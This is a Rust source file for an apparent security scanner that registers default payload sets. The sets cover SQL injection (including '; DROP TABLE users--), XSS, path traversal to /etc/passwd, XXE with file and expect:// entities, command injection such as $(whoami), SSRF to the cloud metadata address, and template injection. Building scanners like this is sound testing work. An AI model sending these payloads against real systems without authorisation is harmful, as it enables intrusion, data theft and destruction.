#![allow(dead_code)]

use std::collections::HashMap;

use crate::scanner::payload::models::PayloadSet;

pub struct PayloadRepository {
    sets: HashMap<String, PayloadSet>,
}

impl PayloadRepository {
    pub fn new() -> Self {
        Self {
            sets: HashMap::new(),
        }
    }

    pub fn register(&mut self, set: PayloadSet) {
        self.sets.insert(set.name.clone(), set);
    }

    pub fn get(&self, name: &str) -> Option<&PayloadSet> {
        self.sets.get(name)
    }

    pub fn list_names(&self) -> Vec<&String> {
        self.sets.keys().collect()
    }

    pub fn with_defaults() -> Self {
        let mut repo = Self::new();
        repo.register(PayloadSet {
            name: "SQL Injection".into(),
            description: "Common SQL injection payloads".into(),
            payloads: vec![
                "' OR 1=1--".into(),
                "' UNION SELECT NULL--".into(),
                "'; DROP TABLE users--".into(),
            ],
        });
        repo.register(PayloadSet {
            name: "XSS".into(),
            description: "Cross-site scripting payloads".into(),
            payloads: vec![
                "<script>alert(1)</script>".into(),
                "<img src=x onerror=alert(1)>".into(),
                "javascript:alert(1)".into(),
            ],
        });
        repo.register(PayloadSet {
            name: "Path Traversal".into(),
            description: "Directory traversal payloads".into(),
            payloads: vec![
                "../../../etc/passwd".into(),
                "..\\..\\..\\windows\\win.ini".into(),
                "....//....//etc/passwd".into(),
            ],
        });
        repo.register(PayloadSet {
            name: "XXE".into(),
            description: "XML external entity payloads".into(),
            payloads: vec![
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>".into(),
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]>"
                    .into(),
            ],
        });
        repo.register(PayloadSet {
            name: "Command Injection".into(),
            description: "OS command injection payloads".into(),
            payloads: vec![
                "; id".into(),
                "| whoami".into(),
                "`cat /etc/passwd`".into(),
                "$(whoami)".into(),
            ],
        });
        repo.register(PayloadSet {
            name: "SSRF".into(),
            description: "Server-side request forgery".into(),
            payloads: vec![
                "http://169.254.169.254/latest/meta-data/".into(),
                "http://localhost:8080/admin".into(),
                "file:///etc/passwd".into(),
            ],
        });
        repo.register(PayloadSet {
            name: "SSTI".into(),
            description: "Server-side template injection".into(),
            payloads: vec!["{{7*7}}".into(), "${7*7}".into(), "<%= 7*7 %>".into()],
        });
        repo
    }
}

impl Default for PayloadRepository {
    fn default() -> Self {
        Self::with_defaults()
    }
}
